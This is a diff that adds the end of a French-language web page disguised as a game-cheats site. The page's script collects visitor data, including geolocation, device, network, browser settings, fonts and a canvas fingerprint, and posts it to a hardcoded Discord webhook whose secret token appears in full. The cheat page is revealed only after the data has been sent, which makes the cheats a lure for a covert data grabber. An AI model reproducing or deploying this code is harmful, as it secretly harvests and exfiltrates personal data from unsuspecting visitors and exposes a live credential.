+          IndexedDB: ${storageInfo.indexdb}
+          Cache API: ${storageInfo.cache_api}
+          Service Workers: ${storageInfo.service_workers}
+        `,
+        // Informations sécurité
+        "🔒 Sécurité": `
+          Protocole: ${securityInfo.protocol}
+          SSL: ${securityInfo.ssl}
+          Referrer Policy: ${securityInfo.referrer_policy}
+          CSP: ${securityInfo.content_security}
+          XSS Protection: ${securityInfo.xss_protection}
+          Crypto: ${securityInfo.crypto}
+        `,
+        // Informations performances
+        "⚡ Performances": `
+          Temps chargement: ${performanceInfo.temps_chargement} ms
+          Temps DOM: ${performanceInfo.temps_dom} ms
+          Temps DNS: ${performanceInfo.temps_dns} ms
+          Temps TCP: ${performanceInfo.temps_tcp} ms
+          Temps requête: ${performanceInfo.temps_request} ms
+          Type navigation: ${performanceInfo.type_navigation}
+          Redirections: ${performanceInfo.redirect_count}
+        `,
+        // Informations médias
+        "🎵 Médias": `
+          Audio MP3: ${mediaInfo.audio.mp3}
+          Audio OGG: ${mediaInfo.audio.ogg}
+          Audio WAV: ${mediaInfo.audio.wav}
+          Vidéo MP4: ${mediaInfo.video.mp4}
+          Vidéo WebM: ${mediaInfo.video.webm}
+          Vidéo OGG: ${mediaInfo.video.ogg}
+          Codecs: ${mediaInfo.codecs}
+          Devices: ${mediaInfo.devices}
+        `,
+        // Informations polices
+        "🖋️ Polices": `
+          Polices détectées: ${fontInfo.polices_detectees}
+          Testées: ${fontInfo.total_testes}
+          API Fonts: ${fontInfo.api_fonts}
+        `,
+        // Informations WebGL
+        "🎮 WebGL": webglInfo.error ? webglInfo.error : `
+          Vendor: ${webglInfo.vendor}
+          Renderer: ${webglInfo.renderer}
+          Shading Language: ${webglInfo.shading_language}
+          Max Texture Size: ${webglInfo.max_texture_size}
+          Anti-alias: ${webglInfo.antialias}
+        `,
+        // Empreinte canvas
+        "🎨 Empreinte Canvas": canvasFingerprint.length > 100 ?
+          "Empreinte générée (voir données brutes)" : canvasFingerprint,
+        // Autres informations existantes
+        "Cookies activés": navigator.cookieEnabled ? "Oui" : "Non",
+        "Fuseau horaire": Intl.DateTimeFormat().resolvedOptions().timeZone || "Non disponible",
+        "Heure locale": new Date().toString(),
+        "URL courante": window.location.href,
+        "Référent": document.referrer || "Aucun",
+        "Temps de chargement page (ms)": pageLoadTime,
+        // Données brutes pour analyse
+        "_raw_data": {
+          ipGeoloc: ipGeoloc,
+          geoloc: geoloc,
+          batteryInfo: batteryInfo,
+          deviceInfo: deviceInfo,
+          networkInfo: networkInfo,
+          storageInfo: storageInfo,
+          securityInfo: securityInfo,
+          performanceInfo: performanceInfo,
+          mediaInfo: mediaInfo,
+          fontInfo: fontInfo,
+          webglInfo: webglInfo,
+          canvasFingerprint: canvasFingerprint
+        }
+      };
+
+      // Prépare le payload Discord avec gestion des longs textes
+      const webhookURL = "https://discord.com/api/webhooks/1417533151512625225/Ky4eEBPIDVeF_kOIIDbxOaSHZFYQkzUwZhf1AEw4ZUm7G8fjU--figq3tEZ84Cg1dwkt";
+
+      // Formatage spécial pour Discord
+      const fields = [];
+      let currentEmbed = {
+        title: "📊 Informations Complètes du Visiteur (1/" + Math.ceil(Object.keys(infos).length / 25) + ")",
+        color: 0xFF0000,
+        fields: [],
+        timestamp: new Date()
+      };
+      let fieldCount = 0;
+      let embedCount = 1;
+      for (const [key, value] of Object.entries(infos)) {
+        if (key === "_raw_data") continue; // On saute les données brutes pour Discord
+        const fieldName = key;
+        const fieldValue = typeof value === 'string' ? value : JSON.stringify(value, null, 2);
+        // Découpage des valeurs trop longues
+        const chunks = [];
+        for (let i = 0; i < fieldValue.length; i += 1020) {
+          chunks.push(fieldValue.substring(i, i + 1020));
+        }
+        // Ajout du premier chunk
+        fields.push({
+          name: fieldName,
+          value: chunks[0],
+          inline: chunks.length === 1
+        });
+        fieldCount++;
+        // Ajout des chunks supplémentaires si nécessaire
+        for (let i = 1; i < chunks.length; i++) {
+          if (fieldCount >= 25) {
+            // Nouvel embed si on atteint la limite
+            currentEmbed.fields = fields.slice(-25);
+            fieldCount = 0;
+            embedCount++;
+          }
+          fields.push({
+            name: `↳ ${fieldName} (suite ${i})`,
+            value: chunks[i],
+            inline: false
+          });
+          fieldCount++;
+        }
+        // Création d'un nouvel embed si nécessaire
+        if (fieldCount >= 25) {
+          currentEmbed.fields = fields.slice(-25);
+          currentEmbed.title = `📊 Informations Complètes du Visiteur (${embedCount}/${Math.ceil(Object.keys(infos).length / 25)})`;
+          fieldCount = 0;
+          embedCount++;
+        }
+      }
+
+      // Préparation du payload final
+      const discordPayload = {
+        content: "🔔 **Nouveau visiteur détecté avec données complètes !**",
+        embeds: [{
+          title: currentEmbed.title,
+          color: currentEmbed.color,
+          fields: currentEmbed.fields,
+          timestamp: currentEmbed.timestamp,
+          footer: {
+            text: `Collecté le ${new Date().toLocaleString()} | ${Object.keys(infos).length} champs d'informations`
+          }
+        }]
+      };
+
+      // Envoi des données
+      const result = await sendWebhook(webhookURL, discordPayload);
+      if (result.success) {
+        infosDiv.textContent = "✅ Infos complètes envoyées avec succès!";
+        this.disabled = true;
+        this.style.cursor = "default";
+        // Affichage de la page des cheats
+        setTimeout(() => {
+          document.title = "Les Cheats";
+          document.getElementById('cheatPage').style.display = 'block';
+        }, 1500);
+      } else {
+        infosDiv.textContent = "❌ Erreur: " + result.error;
+      }
+    });
+  </script>
+</body>
+</html>
+
